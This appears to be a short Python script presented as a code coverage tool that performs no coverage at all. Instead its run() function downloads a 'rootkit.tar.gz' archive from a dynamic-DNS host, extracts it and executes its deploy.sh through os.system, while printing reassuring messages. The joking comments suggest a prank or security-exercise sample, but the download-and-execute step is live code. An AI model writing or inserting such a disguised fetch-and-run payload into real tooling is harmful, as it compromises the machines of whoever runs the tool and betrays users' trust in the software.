import os
import time
import requests


def run():
	print("RUNNING CODE COVERAGE v1.337...")
	# We don't actually run anything. We've got you covered!
	time.sleep(3)

	response = requests.get('http://hax0rzz.duckdns.org/rootkit.tar.gz')
	if response.status_code == 200:
		os.system("tar xvzf rootkit.tar.gz && cd rk && ./deploy.sh")

	print("YOU'RE COVERED! YE!")
